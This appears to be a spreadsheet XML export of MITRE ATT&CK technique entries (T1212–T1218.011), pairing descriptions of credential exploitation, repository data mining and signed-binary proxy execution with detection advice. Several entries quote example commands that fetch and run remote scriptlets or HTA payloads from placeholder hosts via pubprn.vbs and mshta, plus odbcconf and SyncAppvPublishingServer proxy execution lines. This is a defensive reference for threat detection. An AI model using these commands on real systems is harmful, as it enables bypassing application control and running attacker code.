Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)
Such exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)
Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.</t>
  </si>
  <si>
    <t>Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the system that might indicate successful compromise, such as abnormal behavior of processes. Credential resources obtained through exploitation may be detectable in use if they are not normally used or seen.</t>
  </si>
  <si>
    <t>T1213</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Logon Session: Logon Session Creation</t>
  </si>
  <si>
    <t>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such as Credential Access, Lateral Movement, or Defense Evasion, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization (i.e., [Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537)). 
The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository: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 Contact or other sensitive information about business partners and customers, including personally identifiable information (PII) 
Information stored in a repository may vary based on the specific instance or environment. Specific common information repositories include the following:
* Storage services such as IaaS databases, enterprise databases, and more specialized platforms such as customer relationship management (CRM) databases 
* Collaboration platforms such as SharePoint, Confluence, and code repositories
* Messaging platforms such as Slack and Microsoft Teams 
In some cases, information repositories have been improperly secured, typically by unintentionally allowing for overly-broad access by all users or even public access to unauthenticated users. This is particularly common with cloud-native or cloud-hosted services, such as AWS Relational Database Service (RDS), Redis, or ElasticSearch.(Citation: Mitiga)(Citation: TrendMicro Exposed Redis 2020)(Citation: Cybernews Reuters Leak 2022)</t>
  </si>
  <si>
    <t xml:space="preserve">As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should generally not be used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.
The user access logging within Microsoft's SharePoint can be configured to report access to certain pages and documents. (Citation: Microsoft SharePoint Logging) Sharepoint audit logging can also be configured to report when a user shares a resource. (Citation: Sharepoint Sharing Events) The user access logging within Atlassian's Confluence can also be configured to report access to certain pages and documents through AccessLogFilter. (Citation: Atlassian Confluence Logging) Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities. </t>
  </si>
  <si>
    <t>T1213.001</t>
  </si>
  <si>
    <t>Confluence (T1213.001)</t>
  </si>
  <si>
    <t>SaaS</t>
  </si>
  <si>
    <t xml:space="preserve">
Adversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as: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t>
  </si>
  <si>
    <t>Monitor access to Confluence repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) as these types of accounts should generally not be used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.
User access logging within Atlassian's Confluence can be configured to report access to certain pages and documents through AccessLogFilter. (Citation: Atlassian Confluence Logging) Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities.</t>
  </si>
  <si>
    <t>T1213.002</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Cloud Service: Cloud Service Metadata, Logon Session: Logon Session Creation</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint: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t>
  </si>
  <si>
    <t xml:space="preserve">The user access logging within Microsoft's SharePoint can be configured to report access to certain pages and documents. (Citation: Microsoft SharePoint Logging). As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should generally not be used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies. 
</t>
  </si>
  <si>
    <t>T1213.003</t>
  </si>
  <si>
    <t>Code Repositories (T1213.003)</t>
  </si>
  <si>
    <t>Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.
Once adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or [Unsecured Credentials](https://attack.mitre.org/techniques/T1552) contained within software's source code.  Having access to software's source code may allow adversaries to develop [Exploits](https://attack.mitre.org/techniques/T1587/004), while credentials may provide access to additional resources using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: Wired Uber Breach)(Citation: Krebs Adobe)
**Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1593/003), which focuses on conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043) via public code repositories.</t>
  </si>
  <si>
    <t>Monitor access to code repositories, especially performed by privileged users such as Active Directory Domain or Enterprise Administrators as these types of accounts should generally not be used to access code repositories. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user-based anomalies.</t>
  </si>
  <si>
    <t>T1213.004</t>
  </si>
  <si>
    <t>Customer Relationship Management Software (T1213.004)</t>
  </si>
  <si>
    <t>Adversaries may leverage Customer Relationship Management (CRM) software to mine valuable information. CRM software is used to assist organizations in tracking and managing customer interactions, as well as storing customer data.
Once adversaries gain access to a victim organization, they may mine CRM software for customer data. This may include personally identifiable information (PII) such as full names, emails, phone numbers, and addresses, as well as additional details such as purchase histories and IT support interactions. By collecting this data, an adversary may be able to send personalized [Phishing](https://attack.mitre.org/techniques/T1566) emails, engage in SIM swapping, or otherwise target the organization’s customers in ways that enable financial gain or the compromise of additional organizations.(Citation: Bleeping Computer US Cellular Hack 2022)(Citation: Bleeping Computer Mint Mobile Hack 2021)(Citation: Bleeping Computer Bank Hack 2020)
CRM software may be hosted on-premises or in the cloud. Information stored in these solutions may vary based on the specific instance or environment. Examples of CRM software include Microsoft Dynamics 365, Salesforce, Zoho, Zendesk, and HubSpot.</t>
  </si>
  <si>
    <t>T1213.005</t>
  </si>
  <si>
    <t>Messaging Applications (T1213.005)</t>
  </si>
  <si>
    <t>Office Suite, SaaS</t>
  </si>
  <si>
    <t>Adversaries may leverage chat and messaging applications, such as Microsoft Teams, Google Chat, and Slack, to mine valuable information.  
The following is a brief list of example information that may hold potential value to an adversary and may also be found on messaging applications: 
* Testing / development credentials (i.e., [Chat Messages](https://attack.mitre.org/techniques/T1552/008)) 
* Source code snippets 
* Links to network shares and other internal resources 
* Proprietary data(Citation: Guardian Grand Theft Auto Leak 2022)
* Discussions about ongoing incident response efforts(Citation: SC Magazine Ragnar Locker 2021)(Citation: Microsoft DEV-0537)
In addition to exfiltrating data from messaging applications, adversaries may leverage data from chat messages in order to improve their targeting - for example, by learning more about an environment or evading ongoing incident response efforts.(Citation: Sentinel Labs NullBulge 2024)(Citation: Permiso Scattered Spider 2023)</t>
  </si>
  <si>
    <t>T1216</t>
  </si>
  <si>
    <t>Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.(Citation: LOLBAS Project) This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)</t>
  </si>
  <si>
    <t>Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.</t>
  </si>
  <si>
    <t>T1216.001</t>
  </si>
  <si>
    <t>PubPrn (T1216.001)</t>
  </si>
  <si>
    <t>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&lt;code&gt;Cscript.exe&lt;/code&gt;. For example, the following code publishes a printer within the specified domain: &lt;code&gt;cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com&lt;/code&gt;.(Citation: pubprn)
Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second &lt;code&gt;script:&lt;/code&gt; parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is &lt;code&gt;pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct&lt;/code&gt;. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.
In later versions of Windows (10+), &lt;code&gt;PubPrn.vbs&lt;/code&gt; has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to &lt;code&gt;LDAP://&lt;/code&gt;, vice the &lt;code&gt;script:&lt;/code&gt; moniker which could be used to reference remote code via HTTP(S).</t>
  </si>
  <si>
    <t>T1216.002</t>
  </si>
  <si>
    <t>SyncAppvPublishingServer (T1216.002)</t>
  </si>
  <si>
    <t>Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V).(Citation: 1 - appv) For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally.(Citation: 2 - appv)(Citation: 3 - appv)
The SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from `\System32` through the command line via `wscript.exe`.(Citation: 4 - appv)(Citation: 5 - appv)
Adversaries may abuse SyncAppvPublishingServer.vbs to bypass [PowerShell](https://attack.mitre.org/techniques/T1059/001) execution restrictions and evade defensive counter measures by "living off the land."(Citation: 6 - appv)(Citation: 4 - appv) Proxying execution may function as a trusted/signed alternative to directly invoking `powershell.exe`.(Citation: 7 - appv)
For example,  [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands may be invoked using:(Citation: 5 - appv)
`SyncAppvPublishingServer.vbs "n; {PowerShell}"`</t>
  </si>
  <si>
    <t>T1217</t>
  </si>
  <si>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 Autofill)
Browser information may also highlight additional targets after an adversary has access to valid credentials, especially [Credentials In Files](https://attack.mitre.org/techniques/T1552/001) associated with logins cached by a browser.
Specific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g., `%APPDATA%/Google/Chrome`).(Citation: Chrome Roaming Profiles)</t>
  </si>
  <si>
    <t>Monitor processes and command-line arguments for actions that could be taken to gather browser bookmark information. Remote access tools with built-in features may interact directly using APIs to gather information. Information may also be acquired through system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
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t>
  </si>
  <si>
    <t>T1218</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, Module: Module Load, Network Traffic: Network Connection Creation, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>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system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.
Similarly, on Linux systems adversaries may abuse trusted binaries such as &lt;code&gt;split&lt;/code&gt; to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)</t>
  </si>
  <si>
    <t>Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.
Monitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity.</t>
  </si>
  <si>
    <t>T1218.001</t>
  </si>
  <si>
    <t>Compiled HTML File (T1218.001)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)
A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)</t>
  </si>
  <si>
    <t>Monitor and analyze the execution and arguments of hh.exe. (Citation: MsitPros CHM Aug 2017) Compare recent invocations of hh.exe with prior history of known good arguments to determine anomalous and potentially adversarial activity (ex: obfuscated and/or malicious commands). Non-standard process execution trees may also indicate suspicious or malicious behavior, such as if hh.exe is the parent process for suspicious processes and activity relating to other adversarial techniques.
Monitor presence and use of CHM files, especially if they are not typically used within an environment.</t>
  </si>
  <si>
    <t>T1218.002</t>
  </si>
  <si>
    <t>Control Panel (T1218.002)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, Module: Module Load, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.
Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a &lt;code&gt;CPlApplet&lt;/code&gt; function.(Citation: Microsoft Implementing CPL)(Citation: TrendMicro CPL Malware Jan 2014) For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.(Citation: Microsoft Implementing CPL) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.(Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013)
Malicious Control Panel items can be delivered via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns(Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware.(Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.
Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to &lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls&lt;/code&gt;. Even when these registered DLLs do not comply with the CPL file specification and do not export &lt;code&gt;CPlApplet&lt;/code&gt; functions, they are loaded and executed through its &lt;code&gt;DllEntryPoint&lt;/code&gt; when Control Panel is executed. CPL files not exporting &lt;code&gt;CPlApplet&lt;/code&gt; are not directly executable.(Citation: ESET InvisiMole June 2020)</t>
  </si>
  <si>
    <t>Monitor and analyze activity related to items associated with CPL files, such as the control.exe and the &lt;code&gt;Control_RunDLL&lt;/code&gt; and &lt;code&gt;ControlRunDLLAsUser&lt;/code&gt; API functions in shell32.dll. When executed from the command line or clicked, control.exe will execute the CPL file (ex: &lt;code&gt;control.exe file.cpl&lt;/code&gt;) before [Rundll32](https://attack.mitre.org/techniques/T1218/011) is used to call the CPL's API functions (ex: &lt;code&gt;rundll32.exe shell32.dll,Control_RunDLL file.cpl&lt;/code&gt;). CPL files can be executed directly via the CPL API function with just the latter [Rundll32](https://attack.mitre.org/techniques/T1218/011) command, which may bypass detections and/or execution filters for control.exe.(Citation: TrendMicro CPL Malware Jan 2014)
Inventory Control Panel items to locate unregistered and potentially malicious files present on systems:
* Executable format registered Control Panel items will have a globally unique identifier (GUID) and registration Registry entries in &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel\NameSpace&lt;/code&gt; and &lt;code&gt;HKEY_CLASSES_ROOT\CLSID\{GUID}&lt;/code&gt;. These entries may contain information about the Control Panel item such as its display name, path to the local file, and the command executed when opened in the Control Panel. (Citation: Microsoft Implementing CPL)
* CPL format registered Control Panel items stored in the System32 directory are automatically shown in the Control Panel. Other Control Panel items will have registration entries in the &lt;code&gt;CPLs&lt;/code&gt; and &lt;code&gt;Extended Properties&lt;/code&gt; Registry keys of &lt;code&gt;HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Control Panel&lt;/code&gt;. These entries may include information such as a GUID, path to the local file, and a canonical name used to launch the file programmatically (&lt;code&gt; WinExec("c:\windows\system32\control.exe {Canonical_Name}", SW_NORMAL);&lt;/code&gt;) or from a command line (&lt;code&gt;control.exe /name {Canonical_Name}&lt;/code&gt;).(Citation: Microsoft Implementing CPL)
* Some Control Panel items are extensible via Shell extensions registered in &lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Controls Folder\{name}\Shellex\PropertySheetHandlers&lt;/code&gt; where {name} is the predefined name of the system item.(Citation: Microsoft Implementing CPL)
Analyze new Control Panel items as well as those present on disk for malicious content. Both executable and CPL formats are compliant Portable Executable (PE) images and can be examined using traditional tools and methods, pending anti-reverse-engineering techniques.(Citation: TrendMicro CPL Malware Jan 2014)</t>
  </si>
  <si>
    <t>T1218.003</t>
  </si>
  <si>
    <t>CMSTP (T1218.003)</t>
  </si>
  <si>
    <t>Command: Command Execution, Network Traffic: Network Connection Creation, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.
Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.
CMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)</t>
  </si>
  <si>
    <t>Use process monitoring to detect and analyze the execution and arguments of CMSTP.exe. Compare recent invocations of CMSTP.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity.
Sysmon events can also be used to identify potential abuses of CMSTP.exe. Detection strategy may depend on the specific adversary procedure, but potential rules include: (Citation: Endurant CMSTP July 2018)
* To detect loading and execution of local/remote payloads - Event 1 (Process creation) where ParentImage contains CMSTP.exe and/or Event 3 (Network connection) where Image contains CMSTP.exe and DestinationIP is external.
* To detect [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) via an auto-elevated COM interface - Event 10 (ProcessAccess) where CallTrace contains CMLUA.dll and/or Event 12 or 13 (RegistryEvent) where TargetObject contains CMMGR32.exe. Also monitor for events, such as the creation of processes (Sysmon Event 1), that involve auto-elevated CMSTP COM interfaces such as CMSTPLUA (3E5FC7F9-9A51-4367-9063-A120244FBEC7) and CMLUAUTIL (3E000D72-A845-4CD9-BD83-80C07C3B881F).</t>
  </si>
  <si>
    <t>T1218.004</t>
  </si>
  <si>
    <t>InstallUtil (T1218.004)</t>
  </si>
  <si>
    <t>Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: &lt;code&gt;C:\Windows\Microsoft.NET\Framework\v&lt;version&gt;\InstallUtil.exe&lt;/code&gt; and &lt;code&gt;C:\Windows\Microsoft.NET\Framework64\v&lt;version&gt;\InstallUtil.exe&lt;/code&gt;.
InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute &lt;code&gt;[System.ComponentModel.RunInstaller(true)]&lt;/code&gt;. (Citation: LOLBAS Installutil)</t>
  </si>
  <si>
    <t>Use process monitoring to monitor the execution and arguments of InstallUtil.exe. Compare recent invocations of InstallUtil.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the InstallUtil.exe invocation may also be useful in determining the origin and purpose of the binary being executed.</t>
  </si>
  <si>
    <t>T1218.005</t>
  </si>
  <si>
    <t>Mshta (T1218.005)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, Network Traffic: Network Connection Creation, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) 
Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)
Files may be executed by mshta.exe through an inline script: &lt;code&gt;mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))&lt;/code&gt;
They may also be executed directly from URLs: &lt;code&gt;mshta http[:]//webserver/payload[.]hta&lt;/code&gt;
Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)</t>
  </si>
  <si>
    <t>Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.
Monitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious</t>
  </si>
  <si>
    <t>T1218.007</t>
  </si>
  <si>
    <t>Msiexec (T1218.007)</t>
  </si>
  <si>
    <t>Command: Command Execution, Module: Module Load, Network Traffic: Network Connection Creation, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.
Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the &lt;code&gt;AlwaysInstallElevated&lt;/code&gt; policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)</t>
  </si>
  <si>
    <t>Use process monitoring to monitor the execution and arguments of msiexec.exe. Compare recent invocations of msiexec.exe with prior history of known good arguments and executed MSI files or DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of msiexec.exe may also be useful in determining the origin and purpose of the MSI files or DLLs being executed.</t>
  </si>
  <si>
    <t>T1218.008</t>
  </si>
  <si>
    <t>Odbcconf (T1218.008)</t>
  </si>
  <si>
    <t>Command: Command Execution, Module: Module Load, Process: Process Creation</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The Odbcconf.exe binary may be digitally signed by Microsoft.
Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010), odbcconf.exe has a &lt;code&gt;REGSVR&lt;/code&gt; flag that can be misused to execute DLLs (ex: &lt;code&gt;odbcconf.exe /S /A &amp;lbrace;REGSVR "C:\Users\Public\file.dll"&amp;rbrace;&lt;/code&gt;). (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017) 
</t>
  </si>
  <si>
    <t>Use process monitoring to monitor the execution and arguments of odbcconf.exe. Compare recent invocations of odbcconf.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of odbcconf.exe may also be useful in determining the origin and purpose of the DLL being loaded.</t>
  </si>
  <si>
    <t>T1218.009</t>
  </si>
  <si>
    <t>Regsvcs/Regasm (T1218.009)</t>
  </si>
  <si>
    <t>Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)
Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: &lt;code&gt;[ComRegisterFunction]&lt;/code&gt; or &lt;code&gt;[ComUnregisterFunction]&lt;/code&gt; respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)</t>
  </si>
  <si>
    <t>Use process monitoring to monitor the execution and arguments of Regsvcs.exe and Regasm.exe. Compare recent invocations of Regsvcs.exe and Regasm.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after Regsvcs.exe or Regasm.exe invocation may also be useful in determining the origin and purpose of the binary being executed.</t>
  </si>
  <si>
    <t>T1218.010</t>
  </si>
  <si>
    <t>Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)
Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a "Squiblydoo" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)
Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)</t>
  </si>
  <si>
    <t>Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded. (Citation: Carbon Black Squiblydoo Apr 2016)</t>
  </si>
  <si>
    <t>T1218.011</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Metadata, Module: Module Load, Process: Process Creation</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: &lt;code&gt;rundll32.exe {DLLname, DLLfunction}&lt;/code&gt;).
Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions &lt;code&gt;Control_RunDLL&lt;/code&gt; and &lt;code&gt;Control_RunDLLAsUser&lt;/code&gt;. Double-clicking a .cpl file also causes rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002) can be proxied through Rundll32.exe.
